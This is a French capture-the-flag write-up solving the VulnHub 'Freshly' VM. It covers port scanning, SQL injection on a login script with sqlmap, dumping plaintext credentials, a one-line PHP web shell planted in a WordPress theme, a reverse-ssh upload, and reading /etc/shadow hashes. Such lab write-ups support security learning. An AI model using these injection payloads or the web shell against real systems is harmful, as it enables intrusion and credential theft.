# Solution du CTF Freshly de VulnHub

[Freshly](https://vulnhub.com/entry/tophatsec-freshly,118/) est un CTF datant de février 2015 et créé par [TopHatSec](https://www.tophatsec.com/).

Il est plutôt basique et l'exploitation finale manque de panache :p 

```shellsession
$ sudo nmap -sCV -T5 -p- 192.168.56.89
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 09:28 CET
Nmap scan report for 192.168.56.89
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
443/tcp  open  ssl/http Apache httpd
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05
|_Not valid after:  2025-02-14T03:30:05
|_http-server-header: Apache
8080/tcp open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
MAC Address: 08:00:27:14:C0:6A (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

## So much website !

Celui sur le port 80 ne retourne qu'une image alors je lance une énumération :

```shellsession
$ feroxbuster -u http://192.168.56.89/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.89/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      318c http://192.168.56.89/javascript
301        9l       28w      318c http://192.168.56.89/phpmyadmin
403       10l       30w      293c http://192.168.56.89/server-status
```

Je trouve aussi un script `login.php` en recherchant les noms de fichiers.

Ce dernier semble sensible aux caractères spéciaux SQL dans le champ de mot de passe mais au lieu de nous connecter il ne fait qu'affichier `0` ou `1` en résultat.

Ainsi si je rentre `admin` / `admin` ça affiche `0` mais j'obtiens `1` si je rentre `' or '1` comme mot de passe.

Après quelques essais plus poussés le champ `user` est aussi vulnérable : on obtient une temporisation si on tape `admin' or sleep(10) or '`.

Je lance `sqlmap` et en attendant qu'il fasse son job je saute sur le port 443.

Sur ce port on trouve un Wordpress à l'adresse `/wordpress`. Juste en regardant le code source on obtient un bon nombre de métadonnées :

```html
	<script type='text/javascript' src='http://192.168.56.89/wordpress/wp-content/plugins/proplayer/js/swfobject.js'></script>
<!-- All in One SEO Pack 2.2.5.1 by Michael Torbert of Semper Fi Web Design[297,356] -->
<link rel='stylesheet' id='contact-form-7-css' href='https://192.168.56.89/wordpress/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.1' type='text/css' media='all'/>
<link rel='stylesheet' id='cart66-css-css' href='https://192.168.56.89/wordpress/wp-content/plugins/cart66-lite/cart66.css?ver=1.5.3' type='text/css' media='all'/>
<meta name="generator" content="WordPress 4.1"/>
<meta name="generator" content="Cart66 Lite 1.5.3"/>
<a href="https://bitnami.com/stack/wordpress/" title="Semantic Personal Publishing Platform">Proudly powered by Bitnami WordPress Stack</a>
```

En cherchant `proplayer` sur *exploit-db* je trouve deux exploits, tous deux pour de l'injection SQL.

Pour `Cart66` je trouve un XSS, un CSRF et encore une faille SQL. Cette dernière requiert malheureusement un compte valide sur le Wordpress.

Pour le `All In One SEO` Pack je ne trouve que des failles XSS.

A ce stade, vu la lenteur du site *exploit-db.com* ces derniers temps, sqlmap a déjà détecté les vulnérabilités dans le script de login :

```shellsession
$ python sqlmap.py -u http://192.168.56.89/login.php --data "user=test&password=test&s=Submit" --dbms mysql --risk 3 --level 5 --flush-session
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.11.7#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:46:17 /2023-01-02/

[09:46:17] [INFO] flushing session file
[09:46:17] [INFO] testing connection to the target URL
[09:46:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:46:17] [INFO] testing if the target URL content is stable
[09:46:17] [INFO] target URL content is stable
[09:46:17] [INFO] testing if POST parameter 'user' is dynamic
[09:46:17] [WARNING] POST parameter 'user' does not appear to be dynamic
[09:46:17] [WARNING] heuristic (basic) test shows that POST parameter 'user' might not be injectable
[09:46:17] [INFO] testing for SQL injection on POST parameter 'user'
[09:46:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
--- snip ---
[09:46:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:46:38] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:46:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:46:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:46:38] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[09:52:01] [INFO] testing 'Generic UNION query (52) - 21 to 40 columns'
[09:52:02] [INFO] testing 'Generic UNION query (52) - 41 to 60 columns'
[09:52:02] [INFO] testing 'Generic UNION query (52) - 61 to 80 columns'
[09:52:02] [INFO] testing 'Generic UNION query (52) - 81 to 100 columns'
[09:52:02] [INFO] testing 'MySQL UNION query (52) - 1 to 20 columns'
[09:52:02] [INFO] testing 'MySQL UNION query (52) - 21 to 40 columns'
[09:52:02] [INFO] testing 'MySQL UNION query (52) - 41 to 60 columns'
[09:52:02] [INFO] testing 'MySQL UNION query (52) - 61 to 80 columns'
[09:52:02] [INFO] testing 'MySQL UNION query (52) - 81 to 100 columns'
[09:52:02] [INFO] checking if the injection point on POST parameter 'user' is a false positive
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[09:53:52] [INFO] testing if POST parameter 'password' is dynamic
--- snip ---
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 4549 HTTP(s) requests:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=test&password=test' AND (SELECT 2765 FROM (SELECT(SLEEP(5)))JfmU)-- ZRgb&s=Submit

Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=test' AND (SELECT 1752 FROM (SELECT(SLEEP(5)))ArNm)-- pnyG&password=test&s=Submit
---
```

et j'ai pu extraire quelques infos :

```
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

current user: 'root@localhost'
```

Je prends tout de même la peine de tester les failles SQL de `ProPlayer` car je gagnerais du temps si l'une des failles n'est pas time-based (utilisation de la fonction `sleep()`). Malheureusement cette version du plugin ne semble pas vulnérable.

Je jette aussi un oeil au port 8080 mais il ne semble être que la version *en clair* du port 443.

On est bon pour continuer sur ce port 80... et on sent que l'extraction des données va prendre en certains temps.

La base de données login à deux tables, étrange.

```
Database: login
[2 tables]
+-----------+
| user_name |
| users     |
+-----------+
```

Effectivement la première semble plus être un test, on trouve les identifiants suivants dans la seconde :

```
Database: login
Table: users
[2 entries]
+----------+-----------+
| password | user_name |
+----------+-----------+
| password | candyshop |
| PopRocks | Sir       |
+----------+-----------+
```

Ces identifiants ne fonctionnent ni sur le script de login ni sur le Wordpress.

## Hidden in plain text

Quand je dumpe le contenu de la base Wordpress je trouve une table `users` qui ne ressemble pas à la structure habituelle et avec le mot de passe en clair :

```
Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
```

Je parviens tout de même à me connecter en admin sur le Wordpress.

De là je peux éditer un fichier PHP du thème Wordpress pour y ajouter un code d'exécution :

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

J'obtiens alors les droits de l'utilisateur système `daemon`.

J'upload et j'exécute un `reverse-sshx86` et je peux alors me connecter via le client SSH sur le port 31337 de la VM.

Je récupère la config du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bitnami_wordpress');

/** MySQL database username */
define('DB_USER', 'bn_wordpress');

/** MySQL database password */
define('DB_PASSWORD', '33d8f95847');

/** MySQL hostname */
define('DB_HOST', 'localhost:3305');
```

Quand j'affiche le contenu de `/etc/passwd` j'ai une drole de surprise :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
--- snip ---
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
```

La description du CTF indiquait :

> The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)

Sommes-nous arrivés à la fin ?

Je me rend compte aussi que `/etc/shadow` est lisible pour tous :

```
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
daemon:*:16483:0:99999:7:::
bin:*:16483:0:99999:7:::
--- snip ---
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
mysql:!:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
# YOU STOLE MY PASSWORD FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
```

Le hash de l'utilisateur `candycane`  se casse vite (`password`) mais le compte n'a pas de dossier personnel sur le système ni de droits `sudo`.

Le hash de l'utilisateur `root` correspond lui au mot de passe `SuperSecretPassword` que l'on a vu plus tôt.

La VM est aussi vulnérable à `DirtyCOW` ou la faille `overlayfs` mais l'absence de gcc (sur un système 32 bits avec une vieille glibc) nécessite de cross-compiler en static les exploits, ce qui n'est pas très agréable.

*Publié le 2 janvier 2023*
